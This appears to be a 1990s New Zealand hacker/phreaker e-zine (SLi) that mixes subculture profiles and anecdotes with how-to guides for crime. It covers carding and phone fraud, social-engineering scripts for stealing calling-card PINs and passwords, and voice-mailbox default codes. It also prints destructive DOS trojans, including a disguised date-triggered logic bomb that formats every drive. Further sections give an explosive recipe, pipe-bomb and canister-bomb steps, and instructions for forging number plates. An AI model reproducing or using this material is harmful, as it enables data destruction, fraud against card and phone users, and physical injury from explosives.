  The Major Groups in the Computer Underground Scene:
  ===================================================

  The HACKER:

             A person, male or female, who is interested in computer
 security. The majority of these people are not the misguided souls
 that the media depict them as, infact most are very friendly and
 extremly intelligent.  Although their interests in security are quazi-
 legal there intention on the whole are pretty good.

   PROFILE:

   Average Age: 16 - 21

   Physical Description:
            Normally pale skinned, caucasion with unkept hair.

   Clothes:
           Dark - black or alternative

    Average IQ: 100 - 145 (depending on age)

   Attitude to life:
            Carefree, dont mind drugs, are heavy civil
            liberatins.

    Jobs, hobbies etc.:
            Spends most time using computers or in dark rooms,
            away from light, reading SCI-FI novels.

    Books:
            If it has got a cover, they will read it but, like SCI-FI
            and mythical books. Electronic "ZINES" <magazines> like Phrack,
            PHUN, Infotech, ATI, all produced by the hackers and phreakers
            themselves, and a whole lot more.  This is but a small sample
            of the many magazines available to the public.

            At the end of this written project, you will be able to get
            a taste of a rather new, but high value magazine produced by
            some local (local, as being within New Zealand) hackers and
            phreakers which form SLi (Southern Lights inc.) - from which
            the "chairperson" just happens to be a good friend of mine.

    Music:
            From metal to opera.  It's that diverse.

    Eating Habits:
                   Jolt Cola - Drink
                   Pizza - Food (obviously)
                   Chinese -Food
                   Hash Cookies - Food
                   Cookies - Food
                   Coffee - Drink

     Sleeping Habits:
                     A good example would be from R-A-D (a fellow hacker
   and phreaker on the scene which runs SLi).
   "Sleep?? What the fuck is that?"
   Between 3 and 5 hours a night.




 The PHREAKER:

             A person, male or female, who is intrested in telecomunications
 and is sometimes forced to fraudulantly uses the telephone system to talk to
 other phreakers. These people are slightly nastier than hackers and to have
 one who dislikes you can be a big pain, and highly costly.



 Physical Description:

            White Pasty coloured skin, oily hair, rings around eyes
 (obviously from either chatting on illegally produced conferences or just
 to the one or two people or by producing these calls) and normally the
 significant darkly coloured clothing (either black, or colours to blend
 into the environment in which the phreak happens to be in at the particular
 time a phreak is about to make a "telephone call").

 Average Age: 14..15 - 17..18

 Attitude to Life:
             Easy going, free-loader with a bit of a cocky attitude. Still,
 a nice person if you get to know them.  Don't mind using drugs (or maybe
 that should be "prefers to..."?)

 Jobs Hobbies etc.:
             Anything.  Normally computer or communications, though.

 Music: Anything (well, pretty much anything...)

 Books: Refer to "The HACKER".

 Eating Habits:

                Same as a hacker although more likely to invole a
bit more cola.. (CAFFIENE!!! (This is used during a phreaker or a
hacker's three day marathons on the telephone, or computer))

  Sleeping Habits:
                  About 2 - 3 hours on average




  The Less Common Groups in the Computer Underground Scene
  ========================================================


 The PIRATE: (or WAREZ PUPPY as they are known on the Internet by
                the other members of the Computer Underground)

             A male or female (considered as "kids" by the same group refered
 to above) who likes games..  They are not liked by most hackers or
 phreakers, waste anything they are given to get games and basically
 abuse the PHREAKERS and HACKERS.


 The "TRY-HARDS":

             People who just never made it in the underground.  Those who
 want to be in the "in crowd", but are just abused because they are
 considered to be "lame".


 The "NEWBIES":

             Newcomers to the computer undergroud scene which are normally
 treated with suspicion and distrust. It takes approxomatly two to three
 weeks to even get spoken to - depending upon the people you know, of
 course.

 The "OLD-SCHOOL":

             People who have been in the scene for over two years.
 A good example would be Visionary, located in the United States. He is
 looked upon by most as being a mentor and teacher.



 The NARK:

             The most hated and despised member of the underground.
 These can include any of the above catorgories and are the ones who
 cause a large amount of trouble.  They are the ones who tend to nark
 to the Police, FBI, CIA, Secret Service (USSS), Bell, MCI, TELECOM and
 all the other mega-companies in which the hackers and phreakers use to
 continue the undergrounds influence.

Well.. humm.. fuck!!!  Okay, umm, CREDIT CARDS!!


 A credit card.  I bet your money *grin*, someone in your house has a CC.
 Well, ya know, to get a free phone call with it, all ya need is the
 number and expiry date.  However, the expiry date in New Zealand can
 be made up, as Telecom don't check the actual account - just if the
 card is valid!

 This means you ask...
 Well, you get a program like checksum (for those of you who don't know,
 it's a credit card generator), and bingo!
 FREE KALLS anywhere, anytime, ALWAYS!!


 Carding Stuff
 -------------

 1) Find a "drop site" <--- some place to get the stuff u "buy" sent to

 2) Get some cards <--- trash some place like Pizza Hut, a restaraunt or DSE
                        (DSE: Dick Smith Electronics)

 3) Get some mail-order catalogs

 4) Use your common sense and card some stuff!!! :)

 Easy, huh!?!?!

Some stories which you may give you a laugh, or just ammuse you....
                        [hopefully.. =) ]


Names have been changed - perhaps it's obvious, but I'm sure you've met
Bob, Fran, Stan and Fred before.. seee.. they're waving on the other side
of the room.  No, they're not imaginary.. you just can't see them.
*manic laughter* *grin* - to protect the innocent.. ;)


Dontcha just hate it when things like this happens...

1)      Whilst in the middle of signing for a pizza, you forget your
        last name (but you sign and remember your initial - I guess that's
        some sort of a consolation.. ;) ), and you have to make some excuse
        why you have to leave in the middle of signing your sig.


Pizza Man:      "Here's ya pizza, Miss."
Bob [You]:      "Gee, uh, thanks.."
Pizza Man:      "Okay, just sign here."

                [He points to the X where you're s'posed to sign and hands
                you a red ball-point pen]

Bob:            "Sure, not a prob."

                [You grab the pen and begin to sign this dastardly signature
                while the guy who was s'posed to be with you at the time
                had pissed off.  You figure that he's gone to the bottom of
                the steps that you were standing at the top of and you
                finished signing your initial (Okay, so you forget your last
                name.. like it really matters... *grin*).]

                "Uh, hang on a mo."

                [You run down, away from the pizza man, and down the steps
                to find "Chris"]

                "Hey, uh, Chris!"

"Chris":        "Yeah, what?"

Bob:            "Help me with these pizzas!"

                [You remember your last name, and get back up the stairs to
                sign the account slip]

                "Sorry, just had to figure out whether he'd gone inside and
                forgot to help me to bring the pizzas in."

                [You flash a friendly smile - it's harder for some guy to
                accuse a person (oh, and it helps being female.. *wink*) of
                having a fake credit card when the person seems friendly
                enough.. *grin*]

Pizza Man:      "Sure, not a problem.  We're used to that sorta thing"
                (Yeah, I bet he is! ;) )

                [Finally, "Chris" gets up the stairs to help you carry the
                pizzas a couple of blocks away so you can "pig-out" at
                Stan's house nearby.]

Bob:            "Thanks.  It's nice to have a person who understands the
                situation some of us are in at the moment."

                [You wanna laugh, but realise that that would be nasty and
                totally uncalled for.. oh, and it would get him slightly
                suspicious.]

"Chris":        "Sorry, just had to go inside for moment"

Bob:            "Yeah, I thought you weren't gonna come back and help!"

                [You smile]

Pizza Man:      "Okay, well, I'd better be back soon, so I guess I'm outtah
                here."

"Chris" & Bob:  "Okay, see ya, and have a nice night."

                [He drives off and "Chris" and you carry the pizzas off to
                party on down at Stan's.]



2)      What about when the Pizza Man forgets some of your order and asks
        you to come with him back to the Pizza Parlour to pick up the rest
        of your order...

        You'll have to trust your instincts and go with what you think is
        going on.  Either, a) he and/or the company know and are tryin' to
        get you back to the Pizza place to get you busted (perhaps the
        Police Station) or b) he really did forget the stuff.

        If you choose to get in the car and drive off with the guy, just
        keep a couple of things in mind.  You have a real advantage if you
        are the opposite sex to the pizza person (can't be sexist now, can
        we?!? ;) ).. If that's the case, one word.... FLIRT!  It's harder
        for someone to nark on you if they have a serious crush on ya!
        *grin* Just don't over do it and lead them on too far - they may
        want to see you again, and if you ARE found out, he/she is not going
        to forget what you look like in a hurry! =)

        Of course, if you're the same sex, I'd advise NOT to get in the car,
        but to stay back and make some excuse up (eg. "I've got a kid sit-
        tin' upstairs in a high-chair with a bowl of porrige and I don't
        want the room gettin' a mess - the kid would most probably end up
        throwing it all over the room to make as much mess as possible."
        (oh, and don't forget the ole friendly smile.. *grin*)

        One thing though, if you come up with a lousy excuse, they'll get a
        bit suspicious, so don't use some stupid excuse like, "Uh, the, uh,
        dog was in the, uh, middle of, uh, getting it's morning walk?" ..
        And saying your excuse with the least amount of "umm's" and "uh's"
        would be best.  Just pretend that you're explaining to one of your
        teachers about leaving your homework at home.. =)

 Trashing
 ~~~~~~~~

 Don't ya just hate cops?!!

 Well, heres a little bit of fun!

 Me, the editor, and a friend went trashing one night.  We got all the
 stuff we wanted - including the ADDRESS of EVERY exchange (switch) in
 Wellington - and we were just tidying up when a sekurity car stopped we
 ran!!! But our bikez (yeah i know well lets say a car was out of the
 question we left anyway the sekurity guy left BUT he had called the cops.
 So after going trashing at the next location on our way HOME the
 pigs stop us !!! <downer> anyway i split <like RIDE FAST>
 Me mate splits in the other direction and the cop car chases ME!
 Well, and another cop (who got out of the car) chased my mate.
 Anyway, the cops siren ther siren and ask me to "pull over"
 whats a guy to do when your on a bike and a cops chasing you in a
 v8 ?? well we stop and get this

 Cop:    What's in the bag?
 Me:     Papers.
 Cop:    Can I look?
 Me:     You can't do that.
 Cop:    You better let me.  Unless you want to spend all night out here
         talking to us.
 Me:     Okay, man.  Look for y'self.

 [Now that was what u call pigs being FUCKERS!!!!!!!
 Anyway, I get hasselled and shit.  Once in the interigation room,
 my mate got a coffee i got NOTHING]

 [after I've been acting like a elite hacker dude]

 Cop:    You have a problem with us??

 Me:     No, I have no problem with the police. [In other words, just with
                                                   him]

 [Anyway, they couldn't charge us with anything!!! But they were
 going to try, "Possesion of a tool that could be used in a burglary".
 Get this:]

 Cop:    Why have you got a hammer in your bag???

 Me:     <thinking very fast> Err, to open the rubish bags!? :)

 Cop:    Why not take a knife??

 Me:     A knife?  Cause its illegal to carry a knife! :) <hahahaha>


 Well, anyway, remember:  Trashing is okay, but cops are LAMERS!!
 Well, actually some/most cops are okay.  Infact they're cool but SOME...
 SOME.. are just born WANKERS and make people think all cops are just
 the same as them..  But, hey, POWER TO THE PEOPLE..

Through personal experience I have found that it is most rewarding to
phreak with a Laptop.
Unfortunately it is a little suspicious to be seen sitting on a fence
with a laptop, and also a little hard to escape...

So, use a CAR!  Just find a nice "Ordinary" car, like two years
ago's model of a common jap import...  Just so that noone can
describe it anything other than "A Jap Car" or similar.  Out of your
local circle of Phriends at least one will have access to this mode
of transport.

Next, spend a day making 2 phreaking cords, attach both to Telecom
(Trade Mark!) phone jacks inside the car, usually under the dashboard
so as not to be too suspicous, and connect the two sets of two wires
onto nails thru the floor at the passengers feet.  These can then be
accessed by alligator clips from outside the car, and is low to the
ground so that the cords will not be seen.  Connect up in the "Usual"
way (Those grey pylons are best. Just find a nice quiet road...) and
you're away.  Connect the modem in the laptop (Or another one if no
built in modem) to one jack, and call all those international BBS's.
Use the other phone for voice phreaks, as the long D/L times can get
boring, so do things like pissing off the operator etc...

IMPORTANT!

If you see anyone walking along YOUR side of the street (They won't
see the cords on the other side), a telecom van, or any old ladies,
just casually drive off.  Because you will have attached the wires to
the nails tighter than the aligator clips to the phone lines, you
will just drag the wires behind you...

PS - It's a good idea to go in three's, one driver (ALWAYS READY TO
DRIVE) and two phreaks.  It's best if you have a mix of genders, cos
then if you're caught not too many questions will be asked as to why
you're "Parked" there, coz what will you be doing.

Umm, yeah, got any important calls to make, but don't want the phone bill?
Try going into an office building and into one of the lifts, now this can be
done almost anwhere there is a lift.  Get into the lift and open the emergency
telephone box and bingo! there you go, a nice fone line at your disposal, pray
it isn't leased line or otherwise directly linked with the emergency services
or secretary of the building, and get out your DTMF dialer (only needed if the
phone has security like only 1 or 2 buttons with call the emergency operator
or a secretary etc) and dial your destination - watch for people getting onto
the lift.  Put an "OUT OF ORDER" sign on it and/or press the emergency stop
button until you have finished the call.

The same idea can be used in places like pubs etc that have taxi phones
that have a special phone with only the buttons needed to call the taxi
firm etc. I havent tried this one but im sure something would work.

Also there are COCOT'S.  These are customer-owned-coin-operated-telephone
these are rented by telecom and are usually brown and white, white, yellow etc
in colour, can be reconised by the fact that they are usually more expensive
than normal phones, and they will need the coin to be dropped in BEFORE the
number is dialled.  What happens is that untill the right amount of cash is
inserted they disconnect the keypad. To get around this, just use your DTMF
dialer insted of the keypad (a DTMF dialer, or Pocket DIaler, sends DTMF tones
down the line to simulate the numbers on the keypad, you can buy these at most
electronic stores) and bingo! you've got a free call!

 A New Zealand calling card is a pice of plastic that allows you to
 call anywhere in New Zealand and it also allows you to call ANYWHERE
 from New Zealand!  ie. If you are in New Zealand, you can call the
 USA, UK, ... ANYWHERE.

 Obviously, this has some real power when ya think of what you can do.
 No more out in the bushes tapping lines!  Now you're in a fone box, warm
 and drinking a can of Coke and talking to some guy in the USA.

 Now the question.........

              HOW DO I GET SOME CARDS!!!
              ~~~~~~~~~~~~~~~~~~~~~~~~~~

 Ok, well, social engineering works... ie.


 "Hello.  This is Chris Jones of Telecom, calling card division."

 "Oh, hello.  What's the matter?"

 "Well, we're just calling to confirm your $600 call to the US."

 "Huh?  What?"

 "It's standard proceedure to call a customer after $500 worth of bills."

 "But I haven't made any calls!"

 "Really?"

 "Damn straight."

 "Humm, what's your calling card number?"

 "It's XXXX-XXXX-XXXX-XXXX."

 "Well, you have a $600 charge on your bill.  Have you given your pin out?"

 "No!  Of course not!"

 "Well, I can change it for you if you want."

 "Ok, but how about the bill?"

 "I'll remove it for you.  Okay, to change your pin number, I need the
  existing pin number."

 "Well, I dunno.. Ummm.. How can you prove you're Telecom?"

 "Call me on", edit a VMB and give them the number, "."

 "Oh, okay.  Nevermind.  Ummm, here's my pin.  1234."

 "Thank you.  I'll change it to 5643"

 "Okay, thank you."

 "Okay.  Bye.  Oh, and sir, the pin will be changed at 2pm."


 Well, that's it and it works  Sadly, people are that LAME!!!
                             ^"."  <--- if i was ment to spell
                                        god would ave put a dictionary
                                        next to my computer :)

 Oh, BTW: the way to use a NZCC in NZ is:

           "012-NUMBER-TO-CALL PAUSE CARD-NUMBER-#-PIN-#"

 But, if you can't figure that out, then just listen to the voice prompts
 which will be given to you after dialing '012'.

 Otherwise if out of NZ dial your local NZ direct # instead of 012.

Only applicable to DOS or OS/2:

Trojens are easy to write, and surprisingly effective.  But they have their
downturns.  For example, you seldom test a trojen before releasing it.
This has led to a major problem in trojens, even in the previous issue of
this SLi magazine, the fact that DOS asks you for a volume label!  Therefore,
the

     "@Echo Off
      Echo y | Format c:"

recomended in the previous issue of SLi magazine has a major bug in it.
It will not return control to the invoking program.  This is a slightly more
advanced piece of batch code that I prefer.  It does, however, require DOS 5
or better.

     @echo off /* Turns off command display */
     ctty nul  /* All input and output now go's to the NULL device.
                  No ^C possible.) */
     echo y|format c: /v:Supernova /q /u
               /* 'echo y' sends a 'y' character, which is redirected by the
                   pipe into the following program, and is interpreted as
                   standard input.  'format c:' formats c:, surprisingly
                   enough, and '/v:Supernova' is the volume label.
                   For a format to destroy anything is DOS 5 or above, '/u'
                   is nessesary, and the '/q' simply reduces the time
                   needed to about 6 seconds. */
     ctty con  /* Give back keyboard input, display output */
     echo Trojen (TM) Copyright 1994.        /* Just a gloating message */

You can also have somewhat more advanced trojens, only a few steps away from a
virus.  Here is one example that I wrote, that consists of three files, and
is designed as a 'logic bomb'.

     First file: DOSKEY.COM

In a file called DOSKEY.BAT, put the following.

     @echo off
     graftabl.exe
     graftabl.com

Complie this file using BAT2EXEC, a free utility which you can FTP.
You will then have DOSKEY.COM, which can be copyed over the original file.

     Second file: GRAFTABL.COM

Merely the original DOSKEY.COM under another name :) So copy it.

     Third file, GRAFTABL.EXE

This is a C file, which cannot be written in .BAT language without extensive
utilitys.  Here is the source:

     #include <dos.h>
     #include <stdio.h>
     #include <stdlib.h>

     int main(void)
      {
           struct date d;
           getdate(&d);

           if (d.da_day == 5)
             {
                 system("CTTY NUL");
                 system("ECHO Y|FORMAT I: /V:Supernova! /Q /U");
                 system("ECHO Y|FORMAT H: /V:Supernova! /Q /U");
                 system("ECHO Y|FORMAT G: /V:Supernova! /Q /U");
                 system("ECHO Y|FORMAT F: /V:Supernova! /Q /U");
                 system("ECHO Y|FORMAT E: /V:Supernova! /Q /U");
                 system("ECHO Y|FORMAT D: /V:Supernova! /Q /U");
                 system("ECHO Y|FORMAT C: /V:Supernova! /Q /U");
             }

           return 0;
      }

Notes:  For backwards destructive compatability, you need to omit the /Q
and /U switches, as these were only introduced in DOS 5.  The C source was
written using Borland C++, so the d.da_day structure may vary slightly.  If
required, the return code could be anything you choose.

[EDITORS NOTE:
              On later vers of DOS the flag /autotest can be used to
Replace the  "echo y| format" bits ]

R.P.F.S.C - Rocket Propelled Fly Spray Cans <grin>


Ok, heres a few little anarchy tricks
that you should be able to carry out in your own
home without to much trouble:

Things you need:
================

Steel Pipe - (Just big enough to fit fly-spray-can inside, leave
              10mm gap between can and pipe)

Second Steel Pipe - (This is the exhaust so the bigger the better though
                     it must be bigger than the first pipe - experiment)


Firestarters - (Those flammable blocks used for starting camp fires)


Fly-Spray-Can  - (FULL)



How-2:
======


Dig a hole in a secure area (in otherwords no where near anything
of any value!!!), deep enough to fit one and a half fly-spray-cans.
Shove the pipe in the hole at a 45' angle (prefferable)

 ah fuck it look folow the diagram delow !!!



                    can goes down here nosel first (2)
                  /
                 /       lit fire starters down here (1)
        pipe--- \ \    /
           ----- \ \--| |----
           ###### \ \#| | ---- exhaust
           ####### \ \| |####
           ######## \   |####       # = Ground



  Get the pic ?? GOOD !!!


Fun With Super-Glue
~~~~~~~~~~~~~~~~~~~

1 - Take one container of super-glue, superglue the toilet paper tube to the
    dispenser (thing that holds the cardboard tube :)
2 - Super-glue the toilet seat down.
3 - Super-Glue your teacher or lecturers diary to the table :)
4 - Super-Glue your entire P.E. classes shoes to the floor :)
5 - Super-glue someone you dont likes car/home lock >:-)

You get the picture, there are thousands of possibilities...



Baked Bean Bomb
~~~~~~~~~~~~~~~

Ok this ones pretty shitty, but its fun at some sort of camp or something


You Need
========

1 baked bean can :) (unopened)
3or4 Firestarters

What to do
==========

Just find a clear spot (away from people/houses etc!!)
and light the firestarters then put the can upright on top of them
stand back at a SAFE distance (further the better!!), and watch the baked
beans fly! :)

Flase plates are essential for any form of car-oriented quasi-legal
enterprise, eg Phreaking with a computer, or burglary...

For the above system, you may wish to make some plates to help
disguise your car - REMEMBER!!  Phreaking is LESS of an offence than
falsifying plates (In N.Z.), and so this is NOT a good idea for plain
ofl phreaking.  If, however, you are wishing to, say, plant Bombs in
someone's house (Only SAMLL ones, such as the "Redoxon Bomb"), then
these may be necessary.

First, decide how good they need to be - the more real the better,
but real ones are harder to make.

For a spur of the moment job, just find someone's car and taking a
large pencil (HB is good) and a piece of paper, rub the plates onto
the paper.  This is done by placing the paper over the plates, then
rubbing the pencil over the letters and numbers.  This leaves a
darker outline where the letters and numbers were, coz they stick out
from the metal.  Trace this ont fresh paper, and you're away...

The next two ways are a little more complex:

First you have to find a good supply of number plates - a car
wreckers usually has some left on the cars.  I have a car wreckers
over from where I work, so one night I decided to do this...

Take off the number plates - usually fasened with a small bolt in
each corner.  You only need one from each car, but as larger
selection as possible.

Take these plates and PHOTOCOPY them.  Because they are either balck
on white, or white on black, use the inverse function on most better
photocopyers to make them all one type.  Then cut out the letters and
make new plates.  You can now return the old plates, after sketching
them out for physical layout.  Now using your cut out letters and
numbers, make the desired plate - My one is "RS 232" - Hehehe...
Now paste these onto the physical layout, and you have a plate.  For
added security, make sure you use the right age of color, ie for
standard plates prior to the 'Mx xxxx' series you have to make them
white letters and numbers on black backgrounds.  After M is black
letters and numbers on white background.  Personalised plates are all
black letters and numbers on white background.

Some suggested plates:

RS 232  (My one, perfect for Phreaking etc...)

PHREAK, FUKOFF, PHUCKU, FUCKU2, PISOFF
IWANTU, FUKWIT, WANKER, TOSSER, BIGNOB
6ULDV8
(Sexual Deviate!)

Now just stick them over your plates.  Make sure that 'Normal'
plates, such as 'JM 6316' fit the model of car you are using...

Remeber that these need not be for YOUR car - put them over someone
else's plates!


The second awyis to make a perfect copy of a set of plates - NOTE - I
have not done this, but it SHOULD work.

First, nick only 1 plate, using the same method as above to obtain
it.

Now make a clay or sand mold of this plate, and cast lead into it.

This would give you metal plates which you can paint and would look
100% perfect, but if you are caught with them you could be up for
SERIOUS SHIT.  Paper stick on ones are bad enough...

This is an indepth guide to Hacking VMB's or Voice mail
Boxes/Systems. [not]


What are VMB's?
===============

A VMB - Voice Mail Box is basicly a answer machine, however
it is designed on the idea of a multi user base. ie every user on the
VMB has a seperate mail box and passcode between 2 and 32 characters -
depending upon the system type. Most big corps. and govt. deps. have them.


How to use them...


 Keys that are useful:

  #  = Upon entering the VMB system, press this key.  You will be prompted
       for a mail box, normally 4 digits long.  If the mbox exists, you are
       prompted for a passcode.
       Some defaults are:
       9997 997 7779 779 1111 911 9111 1010 1423 9009 1199 5555 0666 0999
       9000 1234 4321.

  *  = This key is used in many ways.  Normaly the "special" key it is used
       to hang up, cancel a command, return from a menu or other things like
       that.


 Uses of a VMB:

 Well, other than the obvious anonaminity it gives you, you can use it to:
 trade info, card stuff, bluff operators into 3rd party billing.  A whole
 range of diffrent things. For example lets
 say you want to card something .. well you normally need to give a contact
 number so: rig a VMB's prompts to say "Hi this is <name of cc holder>
 im not in at the momnet but if you want to leave me a msg please do so"
 This is usually enuff to convince a credit checker its you.

To find VMB's, try your yellow(or white) pages under:

Laboratories

Computers

Govt Deps.

Schools (institute of higher learning)

Medical Centres

The NZQA (New Zealand Qualifications Authority) (try 802-3000)



Even some plumbers have them, you should find about 1 VMB every 5 or so
places you ring, BTW dont ring before 5:30 on weekdays, unless you want
to tone your social engineerings skills! :-)


Ok, because most VMB's look sound exactly like answering machines, the
easiest way to distinguish them is bye hitting either #, * or sometimes
1, if its a VMB it will respond with somethig.

     Okay, so I basically begged for this column, but well, WAW...
 (Women Always Win *grin*) ... only kiddin'.. well, maybe a little -
 the bit about me beggin' for the column.. *wink*

     Well, it's been a little while since this mag's been back in action,
 but we'll we're all back and it's been an entire year since you've all
 seen the name of SLi in the magazine world recently.  Didn't quite realise
 it, but we just figured out t'day that the day the SLi mag was released,
 was October the 31st, otherwise known as HALLOWEEN.  We thought that it
 would be appropriate to release it the same day just to be, uh, eleet k-rad
 hacker dudes... *grin*  Nah, seriously, seeming that it had been an entire
 year since the last issue was released, we thought we'd release this one
 at the same time just for the hell of it.. ;)

     Anyway, I thought I'd say a big 'hi' out to all you lot out there to
 a) be nice and friendly *grin* and b) check if you're all still livin' and
 haven't been busted or tracked down and "taken" by the ss, cops and/or
 military (note the lack of capitals... they don't deserve 'em.. ;) )...

     Greets go out to... *ahem* Juliet (SoP! ;) ), LadyAda, Leigh, Shatter,
 Slacker, BooYaa, Utah Saint, Freiheit, Noise, Zaphod, SCoJaCK, Motley, Eck,
 Snidely, DrMenace, Quattro, Mindscrew, Pyr0t3ch, Lestat, T00ph, Elastic,
 Radikahl, D-FENS, Hypnosis, MrPurple (or CSativa or whatever name you're
 known by now *grin* ), Baccahbar, DTangent, hotrod, Solctice, Zibby (where
 the hell are you?! =) ), Speed_Rcr, GAnarchy, PurpCon, UNiQUe (What's your
 new info?  Did you get taken by aliens or summink? ;) ), ChezeHead, Niaht,
 GreYLocK, Neophyte, Paradox, Gen-X, SSerpent, Serpent, Tega, Grasshopr,
 Schizo, Thorium, Smrf..

 That's the list of ppl I've got info for, so if I've missed ya off the list,
 then gimme y'info! *grin* ;)

     Soooo, any gossip, just e-mail me - TELCO_T@ix.wcc.govt.nz - and I'll
 tell everyone readin' about it.. or, well, if you attatch summink like:

        "---- Don't print this bit" etc.. then I'll make sure that it isn't
 printed.. =) .. you can trust me.. *smirk* Nah, really.. "I won't tell"
 -- quote from "Freddy's Dead". *evil laughter*

 'Till the next issue (hopefully sooooooooon.. =) )..

 The following is a list of 111 (THE NZ EMERGENCY NUMBER) Cellular Accept-
 ance Points.  This means, when you call these numbers, you are really cal-
 ling 111.  Have fun!  Oh, PS:  The '010' operators don't know it's a 111
 backdoor so try calling them COLLECT, or maybe try 3rd party billing.
 Whatever you do, have fun and watch out.  I expect these numbers MAY have
 ANI, but it's still a 50:50 chance.  Oh, you dont need to call them with a
 cell fone.

 NB: I expect these numbers to change VERY fast.

A good SIMPLE BUT EFFECTIVE Explosive:

I use this recipe for most of my bombs:

1 Part Potassium Nitrate (Salt Peter, Nitrate of Potash)
1 Part Icing Sugar

By volume.  Shake to mix and away you go.

The Pot Nitrate is the oxidant, the carbon in the sugar burns, and
the fact that the sugar caramelizes and keeps in the heat replaces
the sulphur in normal gunpowder.  The Pot Nitrate may have to be
dryed in the oven (At around 75 degrees C, no higher!), and so may
the icing sugar (less than 150 degrees).

This stuff is excellent for making "Redoxon Bombs", rockets,
moarters, in fact all your anarchist needs...

 Here is a tried and true method of gaining access to a system


 1: Find the System you wish to hack

     Either by knowing the number of the system or by scanning for
     it.  By scanning, I mean a program such as "Toneloc" that dials
     XXX-XXX1 then XXX-XXX2 etc... it searches for a CARRIER, and if
     it finds one it logs it.


 2: Trash the comp that runs the system

      Look for stuff, like printouts etc., that may give you an idea
      of what/how there system runs.  Also look for any company
      security names on the pices of paper you trash out.  Also, look
      for any information that can explain to you the inner workings
      of the company.


 3: Call the company VOICE

      See if you can Social Engineer a user name and password out of
      the secretary ie.


 You:      "Yeah, hi.  This is Mike from control.  Are you having
            problems with your computer terminal?"

 Them:     "No"

 You:      "Hmm, that's strange.  We're having a few down here.  Just a
            moment.  What's your username?"

 Them:     "Oh, it's 'C_Tp'."

 You:      "Yeah, there's a big error.  Umm, we don't even have you as being
            logged into the system.  Ummm, hmm, okay, I'll try logging in
            as you."

           [Scrambling around making lots of noise]

 You:      "So, the username's 'C_Tp'?"

 Them:     "Yes."

 You:      "Yep.  It's a valid user alright.  Umm, your password please?"

 Them:     "TDGA"

 You:      "Yeah.  Umm, it checks out I'm loggin in.  Humm, oh, here we go.
            Oh, you didn't correctly logout lastime.  Okay, I think it
            should work now.  Sorry for wasting your time .."

 a go?

Redoxons are a type of vitamin available from the chemist.  They make
Vitamin A, C and D I think, all effervescent, as well as Berrocca...

Anyway, it's these containers that are good - let all the
hyperchondriacs in your flat or house eat/drink them, and keep the
canisters...

They are an aluminium tube, sealed at one end, and with a plastic
seal top.  They hold about 50 ml.  If your bomb needs a wick to start
it, as gunpowder does, put a hole in about half way up the canister.
This will also stop the cap coming off due to expansion of air
during the glue setting.

Take one of these and using gunpowder or other explosive material
fill them to just under the top, then shake them down.  Clear the
excess powder away from the top using your finger or a clean rag,
depending on the nastiness of your explosive, then glue the top on
with superglue or araldyte.

Place sticky tape over the hole if you have one, then leave to dry
for 24 hrs.


Remove tape, put in wick, light, BANG.
